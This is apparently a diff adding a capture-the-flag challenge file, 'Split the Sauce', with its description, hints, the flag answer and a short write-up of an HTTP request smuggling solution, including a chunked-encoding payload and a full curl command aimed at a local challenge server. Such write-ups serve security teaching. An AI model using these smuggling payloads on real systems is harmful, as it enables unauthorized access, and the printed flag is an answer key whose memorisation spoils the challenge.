@@ -1,0 +1,42 @@
+#Challenge Name: Split the Sauce
+
+#Challenge Description: 
+	My friend and I had a fight for Sauce packets, since we had only one sauce packet but two sandwich for our lunch. And finally we split the sauce into two equal half and we Shared #TrueFriendship.
+	
+	Recommended:
+		* Use Curl then using Burpsuite
+		* Think out of the Box
+
+	Hint:
+		[Free] Make sure your content in binary format is Correct, and Check for the format also.
+		[Free] Pablo Escobar Inc has Launched another Phone.
+
+#Challenge category:
+	Web
+
+#Challenge Difficulty Level:
+	Medium
+
+#Flag:
+	dc9111{y0U_G0t_Th4t_$0y_S4uC3}
+	
+#Writeup
+	
+* This challenge is all about HTTP request smuggling
+* Here login or directory bruteforcing does not even matter. Just login and check homedirectory.
+* Get the request, Remove all accepted encoding and add Transfer-Encoding to chunked and remove body data and replace with this :
+
+
+	0
+	
+	GET /flag HTTP/1.1
+	Host: 0.0.0.0:45054	
+* convert this into a Curl request and get the flag.
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0.0.0.0:45054' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.Xu9c-Q.wxu7A86T7OjbuUctgl99fdRemdQ' -H $'Transfer-Encoding: chunked' \
+    -b $'session=eyJsb2dnZWRfaW4iOnRydWV9.Xu9c-Q.wxu7A86T7OjbuUctgl99fdRemdQ' \
+    --data-binary $'0\x0d\x0a\x0d\x0aGET /flag HTTP/1.1\x0d\x0aHost: 0.0.0.0:45054' \
+    $'http://0.0.0.0:45054/'
+
+* for More info : https://portswigger.net/web-security/request-smuggling/exploiting
